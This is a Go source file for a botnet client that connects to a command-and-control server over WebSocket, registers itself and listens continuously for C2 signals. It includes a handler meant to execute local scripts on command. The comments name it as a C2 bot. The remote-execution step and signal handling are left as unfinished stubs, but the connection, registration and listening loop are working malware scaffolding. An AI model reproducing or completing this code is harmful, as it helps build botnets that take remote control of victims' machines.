package bot

import (
	"encoding/json"
	"fmt"
	"log"
	"os/exec"
	"strings"

	"github.com/gorilla/websocket"
)

type Message struct {
	Payload string `json:"payload"`
	From    string `json:"from"`
}

type Bot struct {
	ID     string
	Master string
	Conn   *websocket.Conn
}

func NewBot(id, master string) *Bot {
	return &Bot{ID: id, Master: master}
}

// Attempts to establish a WS connection with the C2 layer
func (b *Bot) Connect() error {
	conn, _, err := websocket.DefaultDialer.Dial(b.Master, nil)
	if err != nil {
		return err // TODO: @Azime Benzema [Retry connection after timeout]
	}

	b.Conn = conn
	return nil
}

// Sends a Registration signal to the C2 Layer
func (b *Bot) Register() error {
	return b.Conn.WriteJSON(Message{Payload: "R", From: b.ID})
}

// Handler function to execute local scripts depending on received signal from C2 layer
func (b *Bot) Execute(fname string, args string) error {
	args = strings.TrimSpace(args)
	if args == "" {
		return fmt.Errorf("[×] Failed to execute %s: No args received!\n", fname)
	}

	cmd := exec.Command("") // TODO: @Azime Benzema [Execute relevant scripts]
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("[×] Failed during exection of %s: %s\n%s", fname, err, output)
	}

	log.Printf("[✓] Executed %s! Args: %s", fname, args)
	return nil
}

// Websocket Loop that continuously listens to signals from the C2 layer, staying active
func (b *Bot) Listen() error {
	defer b.Conn.Close()
	log.Printf("[+] Connected to C2 as %s", b.ID)

	for {
		_, data, err := b.Conn.ReadMessage()
		if err != nil {
			return err
		}

		var msg Message
		if err := json.Unmarshal(data, &msg); err != nil {
			log.Printf("Invalid message: %v", err)
			continue
		}

		// TODO: @Azime Benzema [Read incound signals and proceed accordingly]

		log.Printf("[C] Received: %s", msg.Payload)
	}
}

func (b *Bot) Run() error {
	if err := b.Connect(); err != nil {
		return err
	}

	if err := b.Register(); err != nil {
		b.Conn.Close()
		return err
	}

	return b.Listen()
}
